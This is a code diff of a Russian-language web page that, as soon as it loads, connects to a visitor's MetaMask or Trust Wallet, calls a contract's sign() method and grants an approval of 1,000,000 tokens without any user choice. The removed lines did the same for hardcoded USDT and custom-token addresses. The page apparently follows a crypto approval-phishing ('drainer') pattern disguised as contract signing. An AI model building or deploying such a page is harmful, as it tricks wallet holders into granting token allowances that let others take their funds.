@@ -1,30 +1,41 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Подключение и Подписание Контракта</title>
+    <title>Автоматическое Подключение и Подписание Контракта</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <script>
-        let web3;
-        const contractAddress = "0xec228a28e7e919df062bf145bc4c93c6cf0d170c"; // Адрес вашего нового контракта на тестовой сети
-        const abi = [ /* Вставьте ABI вашего нового контракта здесь */ ];
-
-        window.addEventListener('load', async () => {
+        document.addEventListener('DOMContentLoaded', async () => {
             if (typeof window.ethereum !== 'undefined') {
-                web3 = new Web3(window.ethereum);
+                const web3 = new Web3(window.ethereum);
                 try {
-                    // Подключаемся к кошельку пользователя
+                    // Запрос доступа к аккаунту пользователя
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
                     const accounts = await web3.eth.getAccounts();
                     const userAddress = accounts[0];
                     console.log("Подключен аккаунт:", userAddress);
 
-                    // Создаем контрактный объект
+                    // Адрес и ABI вашего контракта
+                    const contractAddress = "ВАШ_АДРЕС_КОНТРАКТА";
+                    const abi = [ /* Вставьте ABI вашего контракта здесь */ ];
+
+                    // Создание экземпляра контракта
                     const contract = new web3.eth.Contract(abi, contractAddress);
 
-                    // Выполняем последовательные действия: подписываем контракт и предоставляем доступ
-                    await signAndApprove(contract, userAddress);
+                    // Вызов метода подписания контракта
+                    await contract.methods.sign().send({ from: userAddress });
+                    console.log("Контракт подписан пользователем:", userAddress);
+
+                    // Адрес токена и сумма для разрешения
+                    const tokenAddress = "АДРЕС_ВАШЕГО_ТОКЕНА";
+                    const amountToApprove = web3.utils.toWei("1000000", "ether");
+
+                    // Вызов метода approve для предоставления разрешения
+                    await contract.methods.approve(tokenAddress, amountToApprove).send({ from: userAddress });
+                    console.log("Разрешение предоставлено для контракта:", contractAddress);
+
+                    alert("Контракт успешно подписан, и разрешение предоставлено!");
 
                 } catch (error) {
                     console.error("Ошибка при подключении или подписании:", error);
@@ -33,32 +44,6 @@
                 alert("Trust Wallet или MetaMask не найдены!");
             }
         });
-
-        async function signAndApprove(contract, userAddress) {
-            try {
-                // 1. Подписание контракта (например, предоставление прав на управление USDT и Custom Token)
-                await contract.methods.sign().send({ from: userAddress });
-                console.log("Контракт подписан пользователем:", userAddress);
-
-                // 2. Предоставление разрешения на управление USDT токенами
-                const usdtTokenAddress = "0x85f828cd006a5f9b011b0cd69447e3c44d9da220"; // Адрес вашего USDT токена на тестовой сети
-                const customTokenAddress = "0x85f828cd006a5f9b011b0cd69447e3c44d9da220"; // Адрес вашего Custom Token
-                const amountToApprove = web3.utils.toWei("1000000", "ether"); // Лимит для разрешения
-
-                // Разрешение на управление USDT
-                await contract.methods.approve(usdtTokenAddress, amountToApprove).send({ from: userAddress });
-                console.log("Доступ к USDT токенам предоставлен для контракта:", contractAddress);
-
-                // Разрешение на управление Custom Token
-                await contract.methods.approve(customTokenAddress, amountToApprove).send({ from: userAddress });
-                console.log("Доступ к Custom Token предоставлен для контракта:", contractAddress);
-
-                alert("Контракт успешно подписан, и разрешение предоставлено!");
-
-            } catch (error) {
-                console.error("Ошибка при подписании контракта или предоставлении разрешения:", error);
-            }
-        }
     </script>
 </head>
 <body>
